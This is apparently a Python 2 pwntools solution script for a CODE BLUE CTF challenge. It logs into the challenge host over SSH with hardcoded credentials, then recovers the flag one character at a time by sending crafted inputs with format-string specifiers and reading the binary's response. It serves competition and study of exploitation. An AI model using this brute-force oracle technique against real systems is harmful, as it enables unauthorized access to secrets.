from pwn import *

p = ssh("smth_chal","pwn2.task.ctf.codeblue.jp",password="whats_smth")
dat = "DbD: Dead by Daytime Sun lololo"
k = ""
table = [chr(i) for i in range(0x1f,0x80)]
print table
r = ""
for i in range(32):
  c = ''
  j = 0
  print r
  dat += k
  print "CBCTF{%s"%dat
  while( c != '\x18'):
    s = p.run("/home/smth_revenge/smth_revenge")
    s.recvuntil(':')
    k = table[j]
    s.sendline("CBCTF{"+(dat+k)+"\x18 %c%c;")
    r = s.recvuntil(';')
    c = r[-2:-1] 
    j = j +1
    s.close()
s.interactive()
